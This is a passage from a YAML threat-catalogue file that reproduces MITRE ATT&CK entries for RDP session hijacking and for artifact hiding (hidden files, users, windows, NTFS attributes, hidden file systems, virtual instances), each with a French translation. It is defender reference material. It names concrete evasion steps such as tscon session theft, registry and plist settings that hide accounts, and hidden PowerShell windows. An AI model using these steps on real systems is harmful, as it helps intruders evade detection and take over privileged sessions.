          \ distante d\u2019un utilisateur l\xE9gitime. En g\xE9n\xE9ral, un utilisateur\
          \ est averti lorsqu\u2019une autre personne tente de voler sa session. Avec\
          \ les permissions syst\xE8me et en utilisant la Console des Services Terminaux,\
          \ \xAB c\_:\\windows\\system32\\tscon.exe [num\xE9ro de session \xE0 voler]\
          \ \xBB, un adversaire peut d\xE9tourner une session sans avoir besoin d\u2019\
          identifiants ou d\u2019invites \xE0 l\u2019utilisateur. (Citation : RDP\
          \ d\xE9tournant Korznikov) Cela peut se faire \xE0 distance ou localement,\
          \ avec des sessions actives ou d\xE9connect\xE9es. (Citation : Moyen de\
          \ d\xE9tournement RDP) Cela peut \xE9galement entra\xEEner une [D\xE9couverte\
          \ Syst\xE8me \xE0 Distance](https://attack.mitre.org/techniques/T1018) et\
          \ une Escalade de Privil\xE8ges en volant une session d\u2019administrateur\
          \ de domaine ou de compte \xE0 privil\xE8ges sup\xE9rieurs. Tout cela peut\
          \ se faire en utilisant des commandes natives Windows, mais cela a aussi\
          \ \xE9t\xE9 ajout\xE9 comme fonctionnalit\xE9 dans les outils de red teaming.\
          \ (Citation : Kali Redsnarf)\nhttps://attack.mitre.org/techniques/T1563/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564
    ref_id: T1564
    name: Hide Artifacts
    description: 'Adversaries may attempt to hide artifacts associated with their
      behaviors to evade detection. Operating systems may have features to hide various
      artifacts, such as important system files and administrative task execution,
      to avoid disrupting user work environments and prevent users from changing files
      or features on the system. Adversaries may abuse these features to hide artifacts
      such as files, directories, user accounts, or other system activity to evade
      detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation:
      MalwareBytes ADS July 2015)


      Adversaries may also attempt to hide artifacts associated with malicious behavior
      by creating computing regions that are isolated from common security instrumentation,
      such as through the use of virtualization technology.(Citation: Sophos Ragnar
      May 2020)

      https://attack.mitre.org/techniques/T1564'
    translations:
      fr:
        name: Cacher les artefacts
        description: "Les adversaires peuvent tenter de dissimuler des artefacts associ\xE9\
          s \xE0 leurs comportements pour \xE9chapper \xE0 la d\xE9tection. Les syst\xE8\
          mes d\u2019exploitation peuvent disposer de fonctionnalit\xE9s pour masquer\
          \ divers artefacts, tels que des fichiers syst\xE8me importants et l\u2019\
          ex\xE9cution de t\xE2ches administratives, afin d\u2019\xE9viter de perturber\
          \ les environnements de travail des utilisateurs et d\u2019emp\xEAcher les\
          \ utilisateurs de modifier des fichiers ou des fonctionnalit\xE9s sur le\
          \ syst\xE8me. Les adversaires peuvent abuser de ces fonctionnalit\xE9s pour\
          \ dissimuler des artefacts tels que des fichiers, des r\xE9pertoires, des\
          \ comptes utilisateurs ou d\u2019autres activit\xE9s syst\xE8me afin d\u2019\
          \xE9chapper \xE0 la d\xE9tection. (Citation : Sofacy Komplex Trojan)(Citation\
          \ : Cybereason OSX Pirrit)(Citation : MalwareBytes ADS juillet 2015)\n\n\
          Les adversaires peuvent \xE9galement tenter de dissimuler les artefacts\
          \ associ\xE9s \xE0 un comportement malveillant en cr\xE9ant des zones informatiques\
          \ isol\xE9es des instruments de s\xE9curit\xE9 courants, par exemple gr\xE2\
          ce \xE0 l\u2019utilisation de technologies de virtualisation. (Citation\
          \ : Sophos Ragnar mai 2020)\nhttps://attack.mitre.org/techniques/T1564"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.001
    ref_id: T1564.001
    name: Hidden Files and Directories
    description: "Adversaries may set files and directories to be hidden to evade\
      \ detection mechanisms. To prevent normal users from accidentally changing special\
      \ files on a system, most operating systems have the concept of a \u2018hidden\u2019\
      \ file. These files don\u2019t show up when a user browses the file system with\
      \ a GUI or when using normal commands on the command line. Users must explicitly\
      \ ask to show the hidden files either via a series of Graphical User Interface\
      \ (GUI) prompts or with command line switches (<code>dir /a</code> for Windows\
      \ and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users\
      \ can mark specific files as hidden simply by putting a \u201C.\u201D as the\
      \ first character in the file or folder name  (Citation: Sofacy Komplex Trojan)\
      \ (Citation: Antiquated Mac Malware). Files and folders that start with a period,\
      \ \u2018.\u2019, are by default hidden from being viewed in the Finder application\
      \ and standard command-line utilities like \u201Cls\u201D. Users must specifically\
      \ change settings to have these files viewable.\n\nFiles on macOS can also be\
      \ marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app,\
      \ but still allows them to be seen in Terminal.app (Citation: WireLurker). On\
      \ Windows, users can mark specific files as hidden by using the attrib.exe binary.\
      \ Many applications create these hidden files and folders to store information\
      \ so that it doesn\u2019t clutter up the user\u2019s workspace. For example,\
      \ SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019\
      s known hosts and keys.\n\nAdditionally, adversaries may name files in a manner\
      \ that would allow the file to be hidden such as naming a file only a \u201C\
      space\u201D character.\n\nAdversaries can use this to their advantage to hide\
      \ files and folders anywhere on the system and evading a typical user or system\
      \ analysis that does not incorporate investigation of hidden files.\nhttps://attack.mitre.org/techniques/T1564/001"
    translations:
      fr:
        name: "Fichiers et annuaires cach\xE9s"
        description: "Les adversaires peuvent dissimuler des fichiers et des r\xE9\
          pertoires pour \xE9chapper aux m\xE9canismes de d\xE9tection. Pour \xE9\
          viter que les utilisateurs normaux ne modifient accidentellement des fichiers\
          \ sp\xE9ciaux sur un syst\xE8me, la plupart des syst\xE8mes d\u2019exploitation\
          \ ont le concept de fichier \xAB cach\xE9 \xBB. Ces fichiers n\u2019apparaissent\
          \ pas lorsqu\u2019un utilisateur navigue dans le syst\xE8me de fichiers\
          \ avec une interface graphique ou lorsqu\u2019il utilise des commandes normales\
          \ en ligne de commande. Les utilisateurs doivent explicitement demander\
          \ \xE0 afficher les fichiers cach\xE9s, soit via une s\xE9rie d\u2019invites\
          \ d\u2019interface graphique (GUI), soit avec des commutateurs en ligne\
          \ de commande (<code>dir/a</code> pour Windows et <code>ls\u2013a</code>\
          \ pour Linux et macOS).\n\nSur Linux et Mac, les utilisateurs peuvent marquer\
          \ certains fichiers comme cach\xE9s simplement en apposant un \xAB . \xBB\
          \ comme premier caract\xE8re dans le nom du fichier ou du dossier (Citation\
          \ : Sofacy Komplex Trojan) (Citation : Malware Mac d\xE9pass\xE9). Les fichiers\
          \ et dossiers commen\xE7ant par un point, '.', sont par d\xE9faut cach\xE9\
          s pour \xEAtre consult\xE9s dans l\u2019application Finder et les utilitaires\
          \ standards en ligne de commande comme \xAB ls \xBB. Les utilisateurs doivent\
          \ sp\xE9cifiquement modifier les param\xE8tres pour que ces fichiers soient\
          \ visibles.\n\nLes fichiers sur macOS peuvent \xE9galement \xEAtre marqu\xE9\
          s avec le drapeau UF_HIDDEN qui emp\xEAche leur visibilit\xE9 dans Finder.app,\
          \ mais permet tout de m\xEAme de les voir dans Terminal.app (Citation :\
          \ WireLurker). Sous Windows, les utilisateurs peuvent marquer des fichiers\
          \ sp\xE9cifiques comme cach\xE9s en utilisant le binaire attrib.exe. De\
          \ nombreuses applications cr\xE9ent ces fichiers et dossiers cach\xE9s pour\
          \ stocker des informations afin qu\u2019elles ne surchargent pas l\u2019\
          espace de travail de l\u2019utilisateur. Par exemple, les utilitaires SSH\
          \ cr\xE9ent un dossier .ssh cach\xE9 qui contient les h\xF4tes et cl\xE9\
          s connus de l\u2019utilisateur.\n\nDe plus, les adversaires peuvent nommer\
          \ les fichiers de mani\xE8re \xE0 permettre de les dissimuler, par exemple\
          \ en nommant un seul caract\xE8re \xAB espace \xBB.\n\nLes adversaires peuvent\
          \ en tirer avantage pour dissimuler des fichiers et dossiers n\u2019importe\
          \ o\xF9 sur le syst\xE8me et \xE9viter une analyse utilisateur ou syst\xE8\
          me typique qui n\u2019inclut pas l\u2019investigation des fichiers cach\xE9\
          s.\nhttps://attack.mitre.org/techniques/T1564/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.002
    ref_id: T1564.002
    name: Hidden Users
    description: "Adversaries may use hidden users to hide the presence of user accounts\
      \ they create or modify. Administrators may want to hide users when there are\
      \ many user accounts on a given system or if they want to hide their administrative\
      \ or other management accounts from other users. \n\nIn macOS, adversaries can\
      \ create or modify a user to be hidden through manipulating plist files, folder\
      \ attributes, and user attributes. To prevent a user from being shown on the\
      \ login screen and in System Preferences, adversaries can set the userID to\
      \ be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code>\
      \ in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation:\
      \ Cybereason OSX Pirrit) Every user has a userID associated with it. When the\
      \ <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with\
      \ a userID under 500 do not appear on the login screen and in System Preferences.\
      \ Using the command line, adversaries can use the <code>dscl</code> utility\
      \ to create hidden user accounts by setting the <code>IsHidden</code> attribute\
      \ to <code>1</code>. Adversaries can also hide a user\u2019s home folder by\
      \ changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide\
      \ a User Account) \n\nAdversaries may similarly hide user accounts in Windows.\
      \ Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\
      Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code>\
      \ for a specific user to prevent that user from being listed on the logon screen.(Citation:\
      \ FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)\n\nOn Linux systems,\
      \ adversaries may hide user accounts from the login screen, also referred to\
      \ as the greeter. The method an adversary may use depends on which Display Manager\
      \ the distribution is currently using. For example, on an Ubuntu system using\
      \ the GNOME Display Manger (GDM), accounts may be hidden from the greeter using\
      \ the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen\
      \ disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display\
      \ Managers are not anchored to specific distributions and may be changed by\
      \ a user or adversary.\nhttps://attack.mitre.org/techniques/T1564/002"
    translations:
      fr:
        name: "Utilisateurs cach\xE9s"
        description: "Les adversaires peuvent utiliser des utilisateurs cach\xE9s\
          \ pour dissimuler la pr\xE9sence des comptes utilisateurs qu\u2019ils cr\xE9\
          ent ou modifient. Les administrateurs peuvent vouloir masquer les utilisateurs\
          \ lorsqu\u2019il y a de nombreux comptes utilisateurs sur un syst\xE8me\
          \ donn\xE9 ou s\u2019ils souhaitent cacher leurs comptes administratifs\
          \ ou autres comptes de gestion aux autres utilisateurs. \n\nDans macOS,\
          \ les adversaires peuvent cr\xE9er ou modifier un utilisateur pour qu\u2019\
          il soit cach\xE9 en manipulant les fichiers plist, les attributs de dossier\
          \ et les attributs utilisateur. Pour \xE9viter qu\u2019un utilisateur ne\
          \ soit affich\xE9 \xE0 l\u2019\xE9cran de connexion et dans les Pr\xE9f\xE9\
          rences syst\xE8me, les adversaires peuvent d\xE9finir l\u2019identifiant\
          \ utilisateur en dessous de 500 et d\xE9finir la valeur cl\xE9 <code>Hide500Users</code>\
          \ \xE0 <code>TRUE</code> dans le fichier <code>plist /Library/Preferences/com.apple.loginwindow</code>.\
          \ (Citation : Cybereason OSX Pirrit) Chaque utilisateur a un identifiant\
          \ utilisateur associ\xE9. Lorsque la valeur cl\xE9 <code>Hide500Users</code>\
          \ est r\xE9gl\xE9e sur <code>TRUE</code>, les utilisateurs ayant un identifiant\
          \ utilisateur inf\xE9rieur \xE0 500 n\u2019apparaissent pas sur l\u2019\xE9\
          cran de connexion ni dans les Pr\xE9f\xE9rences syst\xE8me. En utilisant\
          \ la ligne de commande, les adversaires peuvent utiliser l\u2019utilitaire\
          \ <code>dscl</code> pour cr\xE9er des comptes utilisateurs cach\xE9s en\
          \ fixant l\u2019attribut <code>IsHidden</code> \xE0 <code>1</code>. Les\
          \ adversaires peuvent aussi masquer le dossier d\u2019accueil d\u2019un\
          \ utilisateur en changeant les <code>chflags</code> en cach\xE9s. (Citation\
          \ : Le support Apple Masque un compte utilisateur) \n\nLes adversaires peuvent\
          \ de la m\xEAme fa\xE7on masquer les comptes utilisateurs sous Windows.\
          \ Les adversaires peuvent d\xE9finir la valeur de la cl\xE9 <code>du registre\
          \ HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\\
          UserList</code> Registry \xE0 <code>0</code> pour un utilisateur sp\xE9\
          cifique afin d\u2019emp\xEAcher cet utilisateur d\u2019appara\xEEtre sur\
          \ l\u2019\xE9cran de connexion. (Citation : FireEye SMOKEDHAM, juin 2021)(Citation\
          \ : US-CERT TA18-074A)\n\nSur les syst\xE8mes Linux, les adversaires peuvent\
          \ cacher les comptes utilisateurs \xE0 l\u2019\xE9cran de connexion, \xE9\
          galement appel\xE9 le salutateur. La m\xE9thode qu\u2019un adversaire peut\
          \ utiliser d\xE9pend du gestionnaire d\u2019affichage utilis\xE9 actuellement\
          \ par la distribution. Par exemple, sur un syst\xE8me Ubuntu utilisant le\
          \ GNOME Display Manager (GDM), les comptes peuvent \xEAtre cach\xE9s au\
          \ greeter via la commande <code>gsettings</code> (ex\_: <code>sudo -u gdm\
          \ gsettings set org.gnome.login-screen disable-user-list true</code>). (Citation\
          \ : Masquer les comptes utilisateurs GDM) Les gestionnaires d\u2019affichage\
          \ ne sont pas ancr\xE9s \xE0 des distributions sp\xE9cifiques et peuvent\
          \ \xEAtre modifi\xE9s par un utilisateur ou un adversaire.\nhttps://attack.mitre.org/techniques/T1564/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.003
    ref_id: T1564.003
    name: Hidden Window
    description: "Adversaries may use hidden windows to conceal malicious activity\
      \ from the plain sight of users. In some cases, windows that would typically\
      \ be displayed when an application carries out an operation can be hidden. This\
      \ may be utilized by system administrators to avoid disrupting user work environments\
      \ when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities\
      \ to hide otherwise visible windows from users so as not to alert the user to\
      \ adversary activity on the system.(Citation: Antiquated Mac Malware)\n\nOn\
      \ macOS, the configurations for how applications run are listed in property\
      \ list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>,\
      \ which allows for Java applications to prevent the application's icon from\
      \ appearing in the Dock. A common use for this is when applications run in the\
      \ system tray, but don't also want to show up in the Dock.\n\nSimilarly, on\
      \ Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
      \ Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005)\
      \ to make windows hidden. One example of this is <code>powershell.exe -WindowStyle\
      \ Hidden</code>.(Citation: PowerShell About 2019)\n\nThe Windows Registry can\
      \ also be edited to hide application windows from the current user. For example,\
      \ by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\\Console\\\
      %SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to\
      \ a maximum value, PowerShell windows will open off screen and be hidden.(Citation:\
      \ Cantoris Computing)\n\nIn addition, Windows supports the `CreateDesktop()`\
      \ API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code>\
      \ process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications\
      \ running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation:\
      \ Hidden VNC) will be invisible to other desktops windows.\n\nAdversaries may\
      \ also leverage cmd.exe(Citation: Cybereason - Hidden Malicious Remote Access)\
      \ as a parent process, and then utilize a LOLBin, such as DeviceCredentialDeployment.exe,(Citation:\
      \ LOLBAS Project GitHub Device Cred Dep)(Citation: SecureList BlueNoroff Device\
      \ Cred Dev) to hide windows.\nhttps://attack.mitre.org/techniques/T1564/003"
    translations:
      fr:
        name: "Fen\xEAtre cach\xE9e"
        description: "Les adversaires peuvent utiliser des fen\xEAtres cach\xE9es\
          \ pour dissimuler toute activit\xE9 malveillante \xE0 la vue des utilisateurs.\
          \ Dans certains cas, des fen\xEAtres qui s\u2019afficheraient g\xE9n\xE9\
          ralement lors de l\u2019ex\xE9cution d\u2019une op\xE9ration peuvent \xEA\
          tre masqu\xE9es. Cela peut \xEAtre utilis\xE9 par les administrateurs syst\xE8\
          me pour \xE9viter de perturber les environnements de travail des utilisateurs\
          \ lors de l\u2019ex\xE9cution de t\xE2ches administratives. \n\nLes adversaires\
          \ peuvent abuser de ces fonctionnalit\xE9s pour masquer des fen\xEAtres\
          \ autrement visibles aux utilisateurs afin de ne pas alerter l\u2019utilisateur\
          \ d\u2019une activit\xE9 adversaire sur le syst\xE8me. (Citation : Malware\
          \ Mac d\xE9su\xE8te)\n\nSur macOS, les configurations de fonctionnement\
          \ des applications sont list\xE9es dans des fichiers de liste de propri\xE9\
          t\xE9s (plist). L\u2019un des tags dans ces fichiers peut \xEAtre <code>apple.awt.UIElement</code>,\
          \ qui permet aux applications Java d\u2019emp\xEAcher l\u2019ic\xF4ne de\
          \ l\u2019application d\u2019appara\xEEtre dans le Dock. Une utilisation\
          \ courante de cela est lorsque les applications s\u2019ex\xE9cutent dans\
          \ la barre syst\xE8me, mais ne veulent pas aussi appara\xEEtre dans la station\
          \ d\u2019accueil.\n\nDe m\xEAme, sur Windows, il existe diverses fonctionnalit\xE9\
          s dans les langages de script, comme [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
          \ Jscript et [Visual Basic](https://attack.mitre.org/techniques/T1059/005),\
          \ pour masquer les fen\xEAtres. Un exemple est <code>powershell.exe -WindowStyle\
          \ Hidden</code>. (Citation : PowerShell \xE0 propos de 2019)\n\nLe Registre\
          \ Windows peut \xE9galement \xEAtre modifi\xE9 pour masquer les fen\xEA\
          tres d\u2019application \xE0 l\u2019utilisateur actuel. Par exemple, en\
          \ r\xE9glant la sous-cl\xE9 \xAB WindowPosition \xBB dans la touche du registre\
          \ \xAB HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe\
          \ \xBB \xE0 une valeur maximale, les fen\xEAtres PowerShell s\u2019ouvrent\
          \ hors \xE9cran et restent cach\xE9es. (Citation : Cantoris Computing)\n\
          \nDe plus, Windows prend en compte l\u2019API \xAB CreateDesktop() \xBB\
          \ qui peut cr\xE9er une fen\xEAtre de bureau cach\xE9e avec son propre <code>processus\
          \ explorer.exe</code> correspondant. (Citation : VNC cach\xE9)(Citation\
          \ : Anatomie d\u2019une attaque hVNC)  Toutes les applications fonctionnant\
          \ sur la fen\xEAtre de bureau cach\xE9e, comme une session VNC cach\xE9\
          e (hVNC), (Citation : VNC cach\xE9) seront invisibles pour les autres fen\xEA\
          tres de bureau.\n\nLes adversaires peuvent \xE9galement utiliser cmd.exe(Citation\
          \ : Cybereason - Hidden Malicious Remote Access) comme processus parent,\
          \ puis utiliser un LOLBin, tel que DeviceCredentialDeployment.exe,(Citation\
          \ : LOLBAS Project GitHub Device Cred Dep)(Citation : SecureList BlueNoroff\
          \ Device Cred Dev) pour masquer les fen\xEAtres.\nhttps://attack.mitre.org/techniques/T1564/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.004
    ref_id: T1564.004
    name: NTFS File Attributes
    description: 'Adversaries may use NTFS file attributes to hide their malicious
      data in order to evade detection. Every New Technology File System (NTFS) formatted
      partition contains a Master File Table (MFT) that maintains a record for every
      file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017)
      Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes
      Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data
      Streams (ADSs) when more than one Data attribute is present], that can be used
      to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based
      Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July
      2015) (Citation: Microsoft ADS Mar 2014)


      Adversaries may store malicious data or binaries in file attribute metadata
      instead of directly in files. This may be done to evade some defenses, such
      as static indicator scanning tools and anti-virus. (Citation: Journey into IR
      ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)

      https://attack.mitre.org/techniques/T1564/004'
    translations:
      fr:
        name: Attributs de fichier NTFS
        description: "Les adversaires peuvent utiliser les attributs du fichier NTFS\
          \ pour dissimuler leurs donn\xE9es malveillantes afin d\u2019\xE9chapper\
          \ \xE0 la d\xE9tection. Chaque partition format\xE9e par le New Technology\
          \ File System (NTFS) contient une Table de Fichiers Master (MFT) qui conserve\
          \ un enregistrement pour chaque fichier/r\xE9pertoire sur la partition.\
          \ (Citation : SpectorOps Host-Based juil. 2017) Dans les entr\xE9es MFT\
          \ figurent des attributs de fichiers, (Citation : Microsoft NTFS File Attributes\
          \ ao\xFBt 2010) tels que les attributs \xE9tendus (EA) et les donn\xE9es\
          \ [appel\xE9es flux de donn\xE9es alternatifs (ADS) lorsque plusieurs attributs\
          \ de donn\xE9es sont pr\xE9sents], qui peuvent \xEAtre utilis\xE9s pour\
          \ stocker des donn\xE9es arbitraires (et m\xEAme des fichiers complets).\
          \ (Citation : SpectorOps Host-Based juil. 2017) (Citation : Microsoft File\
          \ Streams) (Citation : MalwareBytes ADS juillet 2015) (Citation : Microsoft\
          \ ADS mars 2014)\n\nLes adversaires peuvent stocker des donn\xE9es malveillantes\
          \ ou des binaires dans des m\xE9tadonn\xE9es d\u2019attributs de fichiers\
          \ au lieu de les stocker directement dans des fichiers. Cela peut \xEAtre\
          \ fait pour contourner certaines d\xE9fenses, telles que les outils de balayage\
          \ statique et l\u2019antivirus \xE0 indicateurs statiques. (Citation : Voyage\
          \ dans IR ZeroAccess NTFS EA) (Citation : MalwareBytes ADS juillet 2015)\n\
          https://attack.mitre.org/techniques/T1564/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.005
    ref_id: T1564.005
    name: Hidden File System
    description: 'Adversaries may use a hidden file system to conceal malicious activity
      from users and security tools. File systems provide a structure to store and
      access data from physical storage. Typically, a user engages with a file system
      through applications that allow them to access files and directories, which
      are an abstraction from their physical location (ex: disk sector). Standard
      file systems include FAT, NTFS, ext4, and APFS. File systems can also contain
      other structures, such as the Volume Boot Record (VBR) and Master File Table
      (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)


      Adversaries may use their own abstracted file system, separate from the standard
      file system present on the infected system. In doing so, adversaries can hide
      the presence of malicious components and file input/output from security tools.
      Hidden file systems, sometimes referred to as virtual file systems, can be implemented
      in numerous ways. One implementation would be to store a file system in reserved
      disk space unused by disk structures or standard file system partitions.(Citation:
      MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation
      could be for an adversary to drop their own portable partition image as a file
      on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries
      may also fragment files across the existing file system structure in non-standard
      ways.(Citation: Kaspersky Equation QA)

      https://attack.mitre.org/techniques/T1564/005'
    translations:
      fr:
        name: "Syst\xE8me de fichiers cach\xE9"
        description: "Les adversaires peuvent utiliser un syst\xE8me de fichiers cach\xE9\
          \ pour dissimuler toute activit\xE9 malveillante aux utilisateurs et aux\
          \ outils de s\xE9curit\xE9. Les syst\xE8mes de fichiers fournissent une\
          \ structure permettant de stocker et d\u2019acc\xE9der aux donn\xE9es depuis\
          \ le stockage physique. En g\xE9n\xE9ral, un utilisateur interagit avec\
          \ un syst\xE8me de fichiers via des applications qui lui permettent d\u2019\
          acc\xE9der \xE0 des fichiers et des r\xE9pertoires, qui sont une abstraction\
          \ de leur emplacement physique (ex. : secteur disque). Les syst\xE8mes de\
          \ fichiers standards incluent FAT, NTFS, ext4 et APFS. Les syst\xE8mes de\
          \ fichiers peuvent \xE9galement contenir d\u2019autres structures, telles\
          \ que l\u2019enregistrement de d\xE9marrage de volume (VBR) et la table\
          \ de fichiers ma\xEEtres (MFT) dans NTFS. (Citation : MalwareTech VFS nov.\
          \ 2014)\n\nLes adversaires peuvent utiliser leur propre syst\xE8me de fichiers\
          \ abstrait, distinct du syst\xE8me de fichiers standard pr\xE9sent sur le\
          \ syst\xE8me infect\xE9. Ce faisant, les adversaires peuvent dissimuler\
          \ la pr\xE9sence de composants malveillants et les entr\xE9es/sorties de\
          \ fichiers aux outils de s\xE9curit\xE9. Les syst\xE8mes de fichiers cach\xE9\
          s, parfois appel\xE9s syst\xE8mes de fichiers virtuels, peuvent \xEAtre\
          \ impl\xE9ment\xE9s de nombreuses fa\xE7ons. Une impl\xE9mentation consisterait\
          \ \xE0 stocker un syst\xE8me de fichiers dans un espace disque r\xE9serv\xE9\
          \ non utilis\xE9 par les structures de disque ou les partitions standard\
          \ du syst\xE8me de fichiers. (Citation : MalwareTech VFS nov. 2014)(Citation\
          \ : Bootkits FireEye) Une autre impl\xE9mentation pourrait consister \xE0\
          \ un adversaire \xE0 d\xE9poser sa propre image de partition portable sous\
          \ forme de fichier au-dessus du syst\xE8me de fichiers standard. (Citation\
          \ : ESET ComRAT mai 2020) Les adversaires peuvent aussi fragmenter les fichiers\
          \ dans la structure existante du syst\xE8me de fichiers de mani\xE8re non\
          \ standard. (Citation : Questions sur l\u2019\xE9quation Kaspersky)\nhttps://attack.mitre.org/techniques/T1564/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.006
    ref_id: T1564.006
    name: Run Virtual Instance
    description: 'Adversaries may carry out malicious operations using a virtual instance
      to avoid detection. A wide variety of virtualization technologies exist that
      allow for the emulation of a computer or computing environment. By running malicious
      code inside of a virtual instance, adversaries can hide artifacts associated
      with their behavior from security tools that are unable to monitor activity
      inside the virtual instance.(Citation: CyberCX Akira Ransomware) Additionally,
      depending on the virtual networking implementation (ex: bridged adapter), network
      traffic generated by the virtual instance can be difficult to trace back to
      the compromised host as the IP address and hostname might not match known values.(Citation:
      SingHealth Breach Jan 2019)


      Adversaries may utilize native support for virtualization (ex: Hyper-V), deploy
      lightweight emulators (ex: QEMU), or drop the necessary files to run a virtual
      instance (ex: VirtualBox binaries).(Citation: Securonix CronTrap 2024) After
      running a virtual instance, adversaries may create a shared folder between the
      guest and host with permissions that enable the virtual instance to interact
      with the host file system.(Citation: Sophos Ragnar May 2020)


      Threat actors may also leverage temporary virtualized environments such as the
      Windows Sandbox, which supports the use of `.wsb` configuration files for defining
      execution parameters. For example, the `<MappedFolder>` property supports the
      creation of a shared folder, while the `<LogonCommand>` property allows the
      specification of a payload.(Citation: ESET MirrorFace 2025)(Citation: ITOCHU
      Hack the Sandbox)(Citation: ITOCHU Sandbox PPT)


      In VMWare environments, adversaries may leverage the vCenter console to create
      new virtual machines. However, they may also create virtual machines directly
      on ESXi servers by running a valid `.vmx` file with the `/bin/vmx` utility.
      Adding this command to `/etc/rc.local.d/local.sh` (i.e., [RC Scripts](https://attack.mitre.org/techniques/T1037/004))
      will cause the VM to persistently restart.(Citation: vNinja Rogue VMs 2024)
      Creating a VM this way prevents it from appearing in the vCenter console or
      in the output to the `vim-cmd vmsvc/getallvms` command on the ESXi server, thereby
      hiding it from typical administrative activities.(Citation: MITRE VMware Abuse
      2024)

      https://attack.mitre.org/techniques/T1564/006'
    translations:
      fr:
        name: "Ex\xE9cuter une instance virtuelle"
        description: "Les adversaires peuvent mener des op\xE9rations malveillantes\
          \ en utilisant une instance virtuelle pour \xE9viter la d\xE9tection. Une\
          \ grande vari\xE9t\xE9 de technologies de virtualisation existent permettant\
          \ l\u2019\xE9mulation d\u2019un ordinateur ou d\u2019un environnement informatique.\
          \ En ex\xE9cutant du code malveillant \xE0 l\u2019int\xE9rieur d\u2019une\
          \ instance virtuelle, les adversaires peuvent dissimuler les artefacts associ\xE9\
          s \xE0 leur comportement aux outils de s\xE9curit\xE9 qui ne peuvent pas\
          \ surveiller l\u2019activit\xE9 \xE0 l\u2019int\xE9rieur de l\u2019instance\
          \ virtuelle. (Citation : CyberCX Akira Ransomware) De plus, selon l\u2019\
          impl\xE9mentation du r\xE9seau virtuel (ex. : adaptateur en pont), le trafic\
          \ r\xE9seau g\xE9n\xE9r\xE9 par l\u2019instance virtuelle peut \xEAtre difficile\
          \ \xE0 retracer jusqu\u2019\xE0 l\u2019h\xF4te compromis, car l\u2019adresse\
          \ IP et le nom d\u2019h\xF4te peuvent ne pas correspondre aux valeurs connues.\
          \ (Citation : Violation de SingHealth janvier 2019)\n\nLes adversaires peuvent\
          \ utiliser un support natif pour la virtualisation (ex : Hyper-V), d\xE9\
          ployer des \xE9mulateurs l\xE9gers (ex : QEMU) ou supprimer les fichiers\
          \ n\xE9cessaires pour ex\xE9cuter une instance virtuelle (ex : binaires\
          \ VirtualBox). (Citation : Securonix CronTrap 2024) Apr\xE8s avoir lanc\xE9\
          \ une instance virtuelle, les adversaires peuvent cr\xE9er un dossier partag\xE9\
          \ entre l\u2019invit\xE9 et l\u2019h\xF4te avec des permissions permettant\
          \ \xE0 l\u2019instance virtuelle d\u2019interagir avec le syst\xE8me de\
          \ fichiers h\xF4te. (Citation : Sophos Ragnar mai 2020)\n\nLes acteurs malveillants\
          \ peuvent \xE9galement exploiter des environnements virtualis\xE9s temporaires\
          \ tels que le bac \xE0 sable Windows, qui supporte l\u2019utilisation de\
          \ fichiers de configuration '.wsb' pour d\xE9finir les param\xE8tres d\u2019\
          ex\xE9cution. Par exemple, la propri\xE9t\xE9 \xAB <MappedFolder>\xBB permet\
          \ la cr\xE9ation d\u2019un dossier partag\xE9, tandis que la <LogonCommand>propri\xE9\
          t\xE9 \xAB \xBB permet de sp\xE9cifier une charge utile. Citation : ESET\
          \ MirrorFace 2025)(Citation : ITOCHU Hack the Sandbox)(Citation : ITOCHU\
          \ Sandbox PPT)\n\nDans les environnements VMWare, les adversaires peuvent\
          \ exploiter la console vCenter pour cr\xE9er de nouvelles machines virtuelles.\
          \ Cependant, ils peuvent aussi cr\xE9er des machines virtuelles directement\
          \ sur les serveurs ESXi en ex\xE9cutant un fichier '.vmx' valide avec l\u2019\
          utilitaire '/bin/vmx'. Ajouter cette commande \xE0 '/etc/rc.local.d/local.sh'\
          \ (c\u2019est-\xE0-dire [RC Scripts](https://attack.mitre.org/techniques/T1037/004))\
          \ fera red\xE9marrer la VM de fa\xE7on persistante. (Citation : vNinja Rogue\
